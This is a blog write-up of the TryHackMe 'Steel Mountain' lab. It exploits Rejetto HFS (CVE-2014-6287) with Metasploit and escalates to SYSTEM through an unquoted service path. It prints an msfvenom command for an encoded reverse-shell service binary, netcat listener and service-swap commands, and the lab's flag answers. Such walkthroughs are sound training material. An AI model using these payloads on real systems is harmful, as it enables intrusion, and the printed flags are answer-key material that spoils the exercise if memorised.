---
title: "TryHackMe: Steel Mountain"
author: Vitorx
categories: [TryHackMe]
tags: [Tryhackme Writeup, Metasploit, Powershell, Privilege Escalation]
render_with_liquid: false
img_path: /images/tryhackme_steel.mountain/
image:
  path: /images/tryhackme_steel.mountain/steel.webp
---

**Steel Mountain** is a beginner-friendly room inspired by the TV series Mr. Robot. The challenge simulates a realistic corporate environment where your goal is to gain access to a fictional company's internal systems.

In this room you will enumerate a Windows machine, gain initial access with Metasploit, use Powershell to further enumerate the machine and escalate your privileges to Administrator.

## First Task - Introduction

After deploying the machine, the first challenge appears: finding out the name of the employee of the month.

To do this, we visit the site at http://target IP

![Web 80 Index](/images/tryhackme_steel.mountain/page.jpg){: width="1200" height="600"}

Then check the page source.

![Web 80 Index](/images/tryhackme_steel.mountain/page.source.jpg){: width="1200" height="600"}

From this, we discover that the employee of the month is **Bill Harper**.

## Second Task - Initial Access

Now that I’ve deployed the machine, let’s get an initial shell!

In this second task, we first need to find out what is the other port running a web server on, To do this, we'll use Nmap.

By opening the terminal and running:

```console
nmap <target IP>
```

We’ll get the following result:

![Web 80 Index](/images/tryhackme_steel.mountain/port.jpg){: width="1200" height="600"}

Using port **8080**, we realize that this is the one we're looking for.

When accessing it, we are presented with the following page:

![Web 80 Index](/images/tryhackme_steel.mountain/page.port.jpg){: width="1200" height="600"}

### In the next question, we're asked to take a look the other web server and find out what file server is running.

![Web 80 Index](/images/tryhackme_steel.mountain/file.server.jpg){: width="1200" height="600"}

After opening the page, we realize it is the **Rejetto HTTP File Server**.

### For the next question, let’s visit <https://www.exploit-db.com> and find out the CVE number to exploit this file server.

![Web 80 Index](/images/tryhackme_steel.mountain/CVE.jpg){: width="1200" height="600"}

As we can see in the image, the answer is **2014–6287**.

### For the final question of this task, we need to use Metasploit to capture the flag.

In Metasploit, I searched for the CVE number we found earlier (CVE-2014-6287) using the search command. This helped me locate the appropriate exploit module for the Rejetto HTTP File Server.

![Web 80 Index](/images/tryhackme_steel.mountain/meta1.jpg){: width="1200" height="600"}

After selecting the module, I configured the necessary options:

- RHOSTS: The target IP address

- RPORT: The port number where the service is running (in this case, 8080)

- LHOST: My local VPN IP, since I'm connected to TryHackMe's VPN

![Web 80 Index](/images/tryhackme_steel.mountain/meta2.jpg){: width="1200" height="600"}

Once everything was set, I ran the exploit command.

![Web 80 Index](/images/tryhackme_steel.mountain/meta3.jpg){: width="1200" height="600"}

It successfully gave us a reverse shell on the target machine.

With shell access, I used the search command to look for the user flag and found it.

![Web 80 Index](/images/tryhackme_steel.mountain/meta4.jpg){: width="1200" height="600"}

![Web 80 Index](/images/tryhackme_steel.mountain/meta5.jpg){: width="1200" height="600"}

![Web 80 Index](/images/tryhackme_steel.mountain/meta6.jpg){: width="1200" height="600"}

**Answer:** b04763b6fcf51fcd7c13abc7db4fd365

## Third Task - Privilege Escalation

Now that I have an initial shell on this Windows machine as Bill, it's time to enumerate the system and escalate privileges to root.

For the enumeration, I’m going to use a PowerShell script called PowerUp, which is designed to scan the machine and identify any potential misconfigurations or privilege escalation vectors.

According to its description, "PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations."

To execute this using Meterpreter, I will type load powershell into meterpreter. Then I will enter powershell by entering powershell_shell:

I paid close attention to the CanRestart option set to true in the PowerUp output. Among the results, I found a service that stood out due to an unquoted service path vulnerability.

![Web 80 Index](/images/tryhackme_steel.mountain/p1.jpg){: width="1200" height="600"}

The name of that service is **AdvancedSystemCareService9**.

Since the CanRestart option was set to true, I realized I could manually restart the service. I also noticed that the directory where the service executable is located was writeable, which meant I could replace the legitimate application with a malicious one. Once replaced, restarting the service would execute my payload.

To generate the payload, I used the following msfvenom command:

```console
msfvenom -p windows/shell_reverse_tcp LHOST=<MY_IP> LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
```

After generating the binary, I uploaded it to the target machine using Metasploit and prepared to replace the original executable.

![Web 80 Index](/images/tryhackme_steel.mountain/p2.jpg){: width="1200" height="600"}

Before copying the file, I stopped the service using:

```console
sc stop AdvancedSystemCareService9
```

![Web 80 Index](/images/tryhackme_steel.mountain/p3.jpg){: width="1200" height="600"}

Then, I copied my Advanced.exe to the Advanced SystemCare directory and replaced the original ASCService.exe.

![Web 80 Index](/images/tryhackme_steel.mountain/p4.jpg){: width="1200" height="600"}

Next, I started a Netcat listener on my local machine to catch the reverse shell:

```console
nc -lvnp 4443
```

Finally, I restarted the service:

```console
sc start AdvancedSystemCareService9
```
As soon as the service started, I received a reverse shell with SYSTEM privileges.

What is the root flag?

![Web 80 Index](/images/tryhackme_steel.mountain/p7.jpg){: width="1200" height="600"}

Flag: **9af5f314f57607c00fd09803a587db80**

## Fourth Task - Access and Privilege Escalation Without Metasploit

In this part of the room, I completed the challenge without using Metasploit.

To do that, I used PowerShell and the tool winPEAS to enumerate the system and gather the necessary information to escalate privileges manually.

I started by using the same CVE (CVE-2014-6287) we used earlier, but this time with a different exploit script.

First, I made sure to have a Netcat static binary on my web server.

The exploit needs to be executed twice:

- The first run downloads the Netcat binary to the target system.

- The second run executes the payload to give us a reverse shell.

I modified the exploit script with my IP and port.

![Web 80 Index](/images/tryhackme_steel.mountain/p7.jpg){: width="1200" height="600"}

After running it, I successfully got a shell.

![Web 80 Index](/images/tryhackme_steel.mountain/p7.jpg){: width="1200" height="600"}

![Web 80 Index](/images/tryhackme_steel.mountain/p7.jpg){: width="1200" height="600"}

![Web 80 Index](/images/tryhackme_steel.mountain/p7.jpg){: width="1200" height="600"}

We’re now onto the system. Now we can pull winPEAS to the system using powershell -c.

After executing winPEAS, it pointed me once again to an unquoted service path vulnerability. It also showed the name of the affected service.

The task question asks: What powershell -c command could we run to manually find out the service name?

To answer this, I used the following command to list all services on the system:

```console
powershell -c "Get-Service"
```

## Conclusion

This challenge was a great opportunity to practice both automated and manual enumeration and privilege escalation techniques on a Windows machine. Starting with an initial shell, I explored common vulnerabilities like unquoted service paths and weak file permissions to escalate privileges.

Using tools like PowerUp and winPEAS helped me identify key misconfigurations, while manually running commands like powershell -c "Get-Service" reinforced the importance of understanding what’s happening behind the scenes.

Additionally, completing the task without Metasploit showed me how powerful native tools and manual exploitation can be when Metasploit is not an option.
